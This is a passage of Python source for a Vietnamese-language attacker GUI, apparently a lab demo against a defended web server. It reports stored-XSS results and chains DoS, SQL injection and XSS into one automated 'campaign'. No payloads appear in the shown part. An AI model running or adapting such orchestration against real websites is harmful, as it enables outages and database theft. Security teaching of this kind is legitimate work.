                        f"Status: {data.get('status')}\n"
                        f"Thông báo: {data.get('message')}\n"
                        f"Mã độc lưu trữ: {data.get('saved_content')}\n"
                        f"Mã độc đã được nạp thành công vào bộ nhớ Web Server và sẵn sàng kích hoạt trên trình duyệt nạn nhân!\n"
                    )
                    self.xss_result_text.insert("1.0", msg)
                    self.log_event("[✓] BẰNG CHỨNG XSS: Máy chủ đã chấp nhận và lưu trữ mã độc vào hệ thống.", "info")
            except Exception as e:
                self.xss_result_text.delete("1.0", "end")
                err_msg = (
                    "❌ PHẢN ĐÒN TỪ MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC!\n"
                    "--------------------------------------------------\n"
                    "Hành vi tiêm mã độc XSS từ IP của bạn đã bị NIDS phát hiện.\n"
                    "Hệ thống HIPS đã kích hoạt Tường lửa OS cô lập kết nối của bạn hoàn toàn (DROP 100%)!\n"
                )
                self.xss_result_text.insert("1.0", err_msg)
                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
                self.log_event("[-] PHẢN ĐÒN TỪ MÁY CHỦ: Bạn đã bị tấn công ngược! Tường lửa HIPS đã khóa IP.", "danger")

        threading.Thread(target=_worker, daemon=True).start()

    # ==========================================
    # CHIẾN DỊCH TOÀN DIỆN (3 TRONG 1)
    # ==========================================
    def start_campaign_attack(self):
        self.log_event("==================================================", "info")
        self.log_event("[CHIẾN DỊCH] BẮT ĐẦU PHÁT ĐỘNG TOÀN DIỆN 3 ĐÒN TẤN CÔNG!", "warning")
        self.log_event("==================================================", "info")

        def _campaign_worker():
            # Bước 1: DoS trong 8 giây
            self.tabview.set("⚡ Tấn Công DoS (Làm Sập Web)")
            self.dur_slider.set(8)
            self._update_dur_label(8)
            self.start_dos_attack()

            # Chờ đợt DoS chạy xong (8s + 2s an toàn)
            time.sleep(10)

            # Bước 2: SQL Injection
            self.tabview.set("💉 SQL Injection (Rút Trích CSDL)")
            self.start_sqli_attack()
            time.sleep(3)

            # Bước 3: XSS
            self.tabview.set("⚠️ Tấn Công XSS (Mã Độc Diễn Đàn)")
            self.start_xss_attack()

        threading.Thread(target=_campaign_worker, daemon=True).start()


def main():
    app = AttackerApp()
    app.mainloop()


if __name__ == "__main__":
    main()
